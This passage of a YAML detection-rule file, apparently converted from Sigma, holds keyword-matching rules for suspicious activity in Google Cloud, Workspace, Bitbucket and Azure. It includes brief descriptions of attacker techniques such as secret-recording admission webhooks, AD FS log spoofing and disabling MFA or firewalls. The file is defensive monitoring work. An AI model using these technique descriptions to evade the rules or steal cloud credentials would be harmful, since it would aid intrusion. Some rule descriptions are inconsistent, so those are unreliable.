  tactic: impact
  description: Identifies when a DNS Zone is modified or deleted in Google Cloud.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - zone
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fe513c69_734c_4d4a_8548_ac5f609be82b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects  when a firewall rule is modified or deleted in Google Cloud
    Platform (GCP).
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - firewall
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_980a7598_1e7f_4962_9372_2d754c930d0e
  intent: data_staging
  tactic: collection
  description: Identifies potential full network packet capture in gcp. This feature
    can potentially be abused to read sensitive data from unencrypted internal traffic.
  conditions:
    summary:
      regex_any:
      - google
      - full
      - network
      - traffic
      - packet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ad91e31_53df_4826_bd27_0166171c8040
  intent: credential_harvesting
  tactic: credential_access
  description: 'Identifies when an admission controller is executed in GCP Kubernetes.

    A Kubernetes Admission controller intercepts, and possibly modifies, requests
    to the Kubernetes API server.

    The behavior of this admission controller is determined by an admission webhook
    (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys
    in the cluster.

    An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining
    persistence in the cluster.

    For example, attackers can intercept and modify the pod creation operations in
    the cluster and add their malicious container to every created pod. An adversary
    can use the webhook ValidatingAdmissionWebhook, which could be used to obtain
    access credentials.

    An adversary could use the webhook to intercept the requests to the API server,
    record secrets, and other sensitive information.

    '
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - kubernetes
      - admission
      - controller
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cd3a808c_c7b7_4c50_a2f3_f4cfcd436435
  intent: execution
  tactic: execution
  description: 'Identifies when a Google Cloud Kubernetes CronJob runs in Azure Cloud.
    Kubernetes Job is a controller that creates one or more pods and ensures that
    a specified number of them successfully terminate.

    Kubernetes Job can be used to run containers that perform finite tasks for batch
    jobs. Kubernetes CronJob is used to schedule Jobs.

    An Adversary may use Kubernetes CronJob for scheduling execution of malicious
    code that would run as a container in the cluster.

    '
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - kubernetes
      - cronjob
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0322d9f2_289a_47c2_b5e1_b63c90901a3e
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the creation or patching of potential malicious RoleBinding.
    This includes RoleBindings and ClusterRoleBinding.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - kubernetes
      - rolebinding
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2f0bae2d_bf20_4465_be86_1311addebaa3
  intent: credential_harvesting
  tactic: credential_access
  description: Identifies when the Secrets are Modified or Deleted.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - kubernetes
      - secrets
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_13f81a90_a69c_4fab_8f07_b5bb55416a9f
  intent: impact_operations
  tactic: impact
  description: Identifies when a service account is disabled or deleted in Google
    Cloud.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - service
      - account
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6b67c12e_5e40_47c6_b3b0_1e6b571184cc
  intent: impact_operations
  tactic: impact
  description: Identifies when a service account is modified in Google Cloud.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - service
      - account
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f346bbd5_2c4e_4789_a221_72de7685090d
  intent: impact_operations
  tactic: impact
  description: Detect when a Cloud SQL DB has been modified or deleted.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - database
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99980a85_3a61_43d3_ac0f_b68d6b4797b1
  intent: impact_operations
  tactic: impact
  description: Identifies when a VPN Tunnel Modified or Deleted in Google Cloud.
  conditions:
    summary:
      regex_any:
      - google
      - cloud
      - tunnel
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_22f2fb54_5312_435d_852f_7c74f81684ca
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects when an access level is changed for a Google workspace application.

    An access level is part of BeyondCorp Enterprise which is Google Workspace''s
    way of enforcing Zero Trust model.

    An adversary would be able to remove access levels to gain easier access to Google
    workspace resources.

    '
  conditions:
    summary:
      regex_any:
      - google
      - workspace
      - application
      - access
      - level
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee2803f0_71c8_4831_b48b_a1fc57601ee4
  intent: impact_operations
  tactic: impact
  description: Detects when an an application is removed from Google Workspace.
  conditions:
    summary:
      regex_any:
      - google
      - workspace
      - application
      - removed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_04e2a23a_9b29_4a5c_be3a_3542e3f982ba
  intent: persistence_installation
  tactic: persistence
  description: Detects when an API access service account is granted domain authority.
  conditions:
    summary:
      regex_any:
      - google
      - workspace
      - granted
      - domain
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_780601d1_6376_4f2a_884e_b8d45599f78c
  intent: impact_operations
  tactic: impact
  description: Detects when multi-factor authentication (MFA) is disabled.
  conditions:
    summary:
      regex_any:
      - google
      - workspace
      - disabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6aef64e3_60c6_4782_8db3_8448759c714e
  intent: impact_operations
  tactic: impact
  description: Detects when an a role is modified or deleted in Google Workspace.
  conditions:
    summary:
      regex_any:
      - google
      - workspace
      - role
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bf638ef7_4d2d_44bb_a1dc_a238252e6267
  intent: impact_operations
  tactic: impact
  description: Detects when an a role privilege is deleted in Google Workspace.
  conditions:
    summary:
      regex_any:
      - google
      - workspace
      - role
      - privilege
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2d1b83e4_17c6_4896_a37b_29140b40a788
  intent: persistence_installation
  tactic: persistence
  description: Detects when an Google Workspace user is granted admin privileges.
  conditions:
    summary:
      regex_any:
      - google
      - workspace
      - user
      - granted
      - admin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_195e1b9d_bfc2_4ffa_ab4e_35aef69815f8
  intent: data_staging
  tactic: collection
  description: Detects when full data export is attempted.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - full
      - data
      - export
      - triggered
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aac6c4f4_87c7_4961_96ac_c3fd3a42c310
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects global permissions change activity.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - global
      - permission
      - changed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e16cf0f0_ee88_4901_bd0b_4c8d13d9ee05
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Bitbucket global secret scanning rule deletion activity.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - global
      - secret
      - scanning
      - rule
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16ab6143_510a_44e2_a615_bdb80b8317fc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects Bitbucket global SSH access configuration changes.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - global
      - settings
      - changed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6aa12161_235a_4dfb_9c74_fe08df8d8da1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects changes to the bitbucket audit log configuration.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - audit
      - configuration
      - updated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b91e8d5e_0033_44fe_973f_b730316f23a1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a repository is exempted from secret scanning feature.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - secret
      - scanning
      - exempt
      - repository
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7215374a_de4f_4b33_8ba5_70804c9251d3
  intent: unknown
  tactic: resource_development
  description: Detects unauthorized access attempts to a resource.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - unauthorized
      - access
      - resource
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_34d81081_03c9_4a7f_91c9_5e46af625cde
  intent: unknown
  tactic: resource_development
  description: Detects when full data export is attempted an unauthorized user.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - unauthorized
      - full
      - data
      - export
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5259cbf2_0a75_48bf_b57a_c54d6fabaef3
  intent: reconnaissance
  tactic: discovery
  description: Detects user data export activity.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - user
      - details
      - export
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_70ed1d26_0050_4b38_a599_92c53d57d45a
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects user authentication failure events.

    Please note that this rule can be noisy and it is recommended to use with correlation
    based on "author.name" field.

    '
  conditions:
    summary:
      regex_any:
      - bitbucket
      - user
      - login
      - failure
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d3f90469_fb05_42ce_b67d_0fded91bbef3
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects SSH user login access failures.

    Please note that this rule can be noisy and is recommended to use with correlation
    based on "author.name" field.

    '
  conditions:
    summary:
      regex_any:
      - bitbucket
      - user
      - login
      - failure
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_87cc6698_3e07_4ba2_9b43_a85a73e151e2
  intent: reconnaissance
  tactic: discovery
  description: Detects user permission data export attempt.
  conditions:
    summary:
      regex_any:
      - bitbucket
      - user
      - permissions
      - export
      - attempt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_288a39fc_4914_4831_9ada_270e9dc12cb4
  intent: defense_evasion
  tactic: defense_evasion
  description: 'This detection uses azureactivity logs (Administrative category) to
    identify the creation or update of a server instance in an Azure AD Hybrid health
    AD FS service.

    A threat actor can create a new AD Health ADFS service and create a fake server
    instance to spoof AD FS signing logs. There is no need to compromise an on-prem
    AD FS server.

    This can be done programmatically via HTTP requests to Azure.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - active
      - directory
      - hybrid
      - health
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48739819_8230_4ee3_a8ea_e0289d1fb0ff
  intent: defense_evasion
  tactic: defense_evasion
  description: 'This detection uses azureactivity logs (Administrative category) to
    identify the deletion of an Azure AD Hybrid health AD FS service instance in a
    tenant.

    A threat actor can create a new AD Health ADFS service and create a fake server
    to spoof AD FS signing logs.

    The health AD FS service can then be deleted after it is not longer needed via
    HTTP requests to Azure.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - active
      - directory
      - hybrid
      - health
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ebbeb024_5b1d_4e16_9c0c_917f86c708a7
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: User Added to an Administrator's Azure AD Role
  conditions:
    summary:
      regex_any:
      - user
      - added
      - administrator
      - azure
      - role
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_410d2a41_1e6d_452f_85e5_abdd8257a823
  intent: impact_operations
  tactic: impact
  description: Identifies when a application is deleted in Azure.
  conditions:
    summary:
      regex_any:
      - azure
      - application
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ad87d14e_7599_4633_ba81_aeb60cfe8cd6
  intent: impact_operations
  tactic: impact
  description: Identifies when a application gateway is modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - application
      - gateway
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_835747f1_9329_40b5_9cc3_97d465754ce6
  intent: impact_operations
  tactic: impact
  description: Identifies when a application security group is modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - application
      - security
      - group
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d2d901db_7a75_45a1_bc39_0cbf00812192
  intent: persistence_installation
  tactic: persistence
  description: Number of VM creations or deployment activities occur in Azure via
    the azureactivity log.
  conditions:
    summary:
      regex_any:
      - number
      - resource
      - creation
      - deployment
      - activities
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_542b9912_c01f_4e3f_89a8_014c48cdca7d
  intent: impact_operations
  tactic: impact
  description: Identifies when a device in azure is no longer managed or compliant
  conditions:
    summary:
      regex_any:
      - azure
      - device
      - longer
      - managed
      - compliant
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_46530378_f9db_4af9_a9e5_889c177d3881
  intent: impact_operations
  tactic: impact
  description: Identifies when a device or device configuration in azure is modified
    or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - device
      - configuration
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_af6925b0_8826_47f1_9324_337507a0babd
  intent: impact_operations
  tactic: impact
  description: Identifies when DNS zone is modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - zone
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_512cf937_ea9b_4332_939c_4c2c94baadcd
  intent: defense_evasion
  tactic: defense_evasion
  description: Identifies when a firewall is created, modified, or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - firewall
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_025c9fe7_db72_49f9_af0d_31341dd7dd57
  intent: defense_evasion
  tactic: defense_evasion
  description: Identifies when Rule Collections (Application, NAT, and Network) is
    being modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - firewall
      - rule
      - collection
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a622fcd2_4b5a_436a_b8a2_a4171161833c
  intent: persistence_installation
  tactic: persistence
  description: Identifies IPs from which users grant access to other users on azure
    resources and alerts when a previously unseen source IP address is used.
  conditions:
    summary:
      regex_any:
      - granting
      - permissions
      - account
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_80eeab92_0979_4152_942d_96749e11df40
  intent: credential_harvesting
  tactic: credential_access
  description: Identifies when a Keyvault Key is modified or deleted in Azure.
  conditions:
    summary:
      regex_any:
      - azure
      - keyvault
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_459a2970_bb84_4e6a_a32e_ff0fbd99448d
  intent: credential_harvesting
  tactic: credential_access
  description: Identifies when a key vault is modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - vault
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b831353c_1971_477b_abb6_2828edc3bca1
  intent: credential_harvesting
  tactic: credential_access
  description: Identifies when secrets are modified or deleted in Azure.
  conditions:
    summary:
      regex_any:
      - azure
      - keyvault
      - secrets
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a61a3c56_4ce2_4351_a079_88ae4cbd2b58
  intent: credential_harvesting
  tactic: credential_access
  description: 'Identifies when an admission controller is executed in Azure Kubernetes.

    A Kubernetes Admission controller intercepts, and possibly modifies, requests
    to the Kubernetes API server.

    The behavior of this admission controller is determined by an admission webhook
    (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys
    in the cluster.

    An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining
    persistence in the cluster.

    For example, attackers can intercept and modify the pod creation operations in
    the cluster and add their malicious container to every created pod.

    An adversary can use the webhook ValidatingAdmissionWebhook, which could be used
    to obtain access credentials.

    An adversary could use the webhook to intercept the requests to the API server,
    record secrets, and other sensitive information.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - admission
      - controller
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1c71e254_6655_42c1_b2d6_5e4718d7fc0a
  intent: execution
  tactic: execution
  description: 'Identifies when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes
    Job is a controller that creates one or more pods and ensures that a specified
    number of them successfully terminate.

    Kubernetes Job can be used to run containers that perform finite tasks for batch
    jobs. Kubernetes CronJob is used to schedule Jobs.

    An Adversary may use Kubernetes CronJob for scheduling execution of malicious
    code that would run as a container in the cluster.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - cronjob
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_225d8b09_e714_479c_a0e4_55e6f29adf35
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when Events are deleted in Azure Kubernetes. An adversary may
    delete events in Azure Kubernetes in an attempt to evade detection.
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - events
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_08d6ac24_c927_4469_b3b7_2e422d6e3c43
  intent: credential_harvesting
  tactic: credential_access
  description: Identifies when a Azure Kubernetes network policy is modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - network
      - policy
      - change
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b02f9591_12c3_4965_986a_88028629b2e1
  intent: impact_operations
  tactic: impact
  description: Identifies the deletion of Azure Kubernetes Pods.
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - pods
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_25cb259b_bbdc_4b87_98b7_90d7c72f8743
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the creation or patching of potential malicious RoleBinding/ClusterRoleBinding.
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - rolebinding
      - clusterrolebinding
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_818fee0c_e0ec_4e45_824e_83e4817b0887
  intent: impact_operations
  tactic: impact
  description: Identifies when ClusterRoles/Roles are being modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - sensitive
      - role
      - access
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7ee0b4aa_d8d4_4088_b661_20efdf41a04c
  intent: impact_operations
  tactic: impact
  description: Identifies when a Kubernetes account access a sensitive objects such
    as configmaps or secrets.
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - secret
      - config
      - object
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_12d027c3_b48c_4d9d_8bb6_a732200034b2
  intent: impact_operations
  tactic: impact
  description: Identifies when a service account is modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - kubernetes
      - service
      - account
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7ea78478_a4f9_42a6_9dcd_f861816122bf
  intent: persistence_installation
  tactic: persistence
  description: Detection for when multi factor authentication has been disabled, which
    might indicate a malicious activity to bypass authentication mechanisms.
  conditions:
    summary:
      regex_any:
      - disabled
      - bypass
      - authentication
      - mechanisms
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_83c17918_746e_4bd9_920b_8e098bf88c23
  intent: defense_evasion
  tactic: defense_evasion
  description: Identifies when a Firewall Policy is Modified or Deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - network
      - firewall
      - policy
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2a7d64cf_81fa_4daf_ab1b_ab80b789c067
  intent: impact_operations
  tactic: impact
  description: Identifies when a Firewall Rule Configuration is Modified or Deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - firewall
      - rule
      - configuration
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d9557b75_267b_4b43_922f_a775e2d1f792
  intent: impact_operations
  tactic: impact
  description: Identifies when a Point-to-site VPN is Modified or Deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - point
      - site
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d22b4df4_5a67_4859_a578_8c9a0b5af9df
  intent: impact_operations
  tactic: impact
  description: Identifies when a network security configuration is modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - network
      - security
      - configuration
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_15ef3fac_f0f0_4dc4_ada0_660aa72980b3
  intent: impact_operations
  tactic: impact
  description: 'Identifies when a virtual network device is being modified or deleted.

    This can be a network interface, network virtual appliance, virtual hub, or virtual
    router.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - virtual
      - network
      - device
      - modified
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_72af37e2_ec32_47dc_992b_bc288a2708cb
  intent: execution
  tactic: execution
  description: Identifies when a new cloudshell is created inside of Azure portal.
  conditions:
    summary:
      regex_any:
      - azure
      - cloudshell
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_636e30d5_3736_42ea_96b1_e6e2f8429fd6
  intent: defense_evasion
  tactic: defense_evasion
  description: Identifies when a owner is was removed from a application or service
    principal in Azure.
  conditions:
    summary:
      regex_any:
      - azure
      - owner
      - removed
      - from
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c1182e02_49a3_481c_b3de_0fadc4091488
  intent: credential_harvesting
  tactic: credential_access
  description: Identifies IPs from which users grant access to other users on azure
    resources and alerts when a previously unseen source IP address is used.
  conditions:
    summary:
      regex_any:
      - rare
      - subscription
      - level
      - operations
      - azure
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0ddcff6d_d262_40b0_804b_80eb592de8e3
  intent: defense_evasion
  tactic: defense_evasion
  description: Identifies when a service principal is created in Azure.
  conditions:
    summary:
      regex_any:
      - azure
      - service
      - principal
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_448fd1ea_2116_4c62_9cde_a92d120e0f08
  intent: defense_evasion
  tactic: defense_evasion
  description: Identifies when a service principal was removed in Azure.
  conditions:
    summary:
      regex_any:
      - azure
      - service
      - principal
      - removed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_09438caa_07b1_4870_8405_1dbafe3dad95
  intent: unknown
  tactic: initial_access
  description: 'Detects when a user has been elevated to manage all Azure Subscriptions.

    This change should be investigated immediately if it isn''t planned.

    This setting could allow an attacker access to Azure subscriptions in your environment.

    '
  conditions:
    summary:
      regex_any:
      - azure
      - subscription
      - permission
      - elevation
      - activitylogs
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_92cc3e5d_eb57_419d_8c16_5c63f325a401
  intent: impact_operations
  tactic: impact
  description: Identifies when a suppression rule is created in Azure. Adversary's
    could attempt this to evade detection.
  conditions:
    summary:
      regex_any:
      - azure
      - suppression
      - rule
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bcfcc962_0e4a_4fd9_84bb_a833e672df3f
  intent: impact_operations
  tactic: impact
  description: Identifies when a Virtual Network is modified or deleted in Azure.
  conditions:
    summary:
      regex_any:
      - azure
      - virtual
      - network
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_61171ffc_d79c_4ae5_8e10_9323dba19cd3
  intent: impact_operations
  tactic: impact
  description: Identifies when a VPN connection is modified or deleted.
  conditions:
    summary:
      regex_any:
      - azure
      - connection
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_26e7c5e2_6545_481e_b7e6_050143459635
  intent: persistence_installation
  tactic: persistence
  description: Monitor and alert on conditional access changes where non approved
    actor removed CA Policy.
  conditions:
    summary:
      regex_any:
      - policy
      - removed
      - approved
      - actor
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_50a3c7aa_ec29_44a4_92c1_fce229eef6fc
  intent: persistence_installation
  tactic: persistence
  description: Monitor and alert on conditional access changes. Is Initiated by (actor)
    approved to make changes? Review Modified Properties and compare "old" vs "new"
    value.
  conditions:
    summary:
      regex_any:
      - policy
      - updated
      - approved
      - actor
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0922467f_db53_4348_b7bf_dee8d0d348c6
  intent: defense_evasion
  tactic: defense_evasion
  description: Monitor and alert on conditional access changes.
  conditions:
    summary:
      regex_any:
      - policy
      - approved
      - actor
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6f583da0_3a90_4566_a4ed_83c09fe18bbf
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when an account was created and deleted in a short period of
    time.
  conditions:
    summary:
      regex_any:
      - account
      - created
      - deleted
      - within
      - close
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a0413867_daf3_43dd_9245_734b3a787942
  intent: defense_evasion
  tactic: defense_evasion
  description: Monitor and alert for Bitlocker key retrieval.
  conditions:
    summary:
      regex_any:
      - bitlocker
      - retrieval
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c2496b41_16a9_4016_a776_b23f8910dc58
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when certificate based authentication has been enabled in an
    Azure Active Directory tenant.
  conditions:
    summary:
      regex_any:
      - certificate
      - based
      - authentication
      - enabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9494bff8_959f_4440_bbce_fb87a208d517
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Monitor and alert for changes to the device registration policy.
  conditions:
    summary:
      regex_any:
      - changes
      - device
      - registration
      - policy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4ad97bf5_a514_41a4_abd3_4f3455ad4865
  intent: unknown
  tactic: initial_access
  description: Detects guest users being invited to tenant by non-approved inviters
  conditions:
    summary:
      regex_any:
      - guest
      - users
      - invited
      - tenant
      - approved
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4bb80281_3756_4ec8_a88e_523c5a6fda9e
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects newly added root certificate authority to an AzureAD tenant
    to support certificate based authentication.
  conditions:
    summary:
      regex_any:
      - root
      - certificate
      - authority
      - added
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_11c767ae_500b_423b_bae3_b234450736ed
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Monitor and alert for users added to device admin roles.
  conditions:
    summary:
      regex_any:
      - users
      - added
      - global
      - device
      - admin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1b45b0d1_773f_4f23_aedc_814b759563b1
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects when a configuration change is made to an applications AppID
    URI.
  conditions:
    summary:
      regex_any:
      - application
      - appid
      - configuration
      - changes
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cbb67ecc_fb70_4467_9350_c910bdf7c628
  intent: persistence_installation
  tactic: persistence
  description: Detects when a new credential is added to an existing application.
    Any additional credentials added outside of expected processes could be a malicious
    actor using those credentials.
  conditions:
    summary:
      regex_any:
      - added
      - credentials
      - existing
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a6355fbe_f36f_45d8_8efc_ab42465cbc52
  intent: credential_harvesting
  tactic: credential_access
  description: Detects when highly privileged delegated permissions are granted on
    behalf of all users
  conditions:
    summary:
      regex_any:
      - delegated
      - permissions
      - granted
      - users
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7091372f_623c_4293_bc37_20c32b3492be
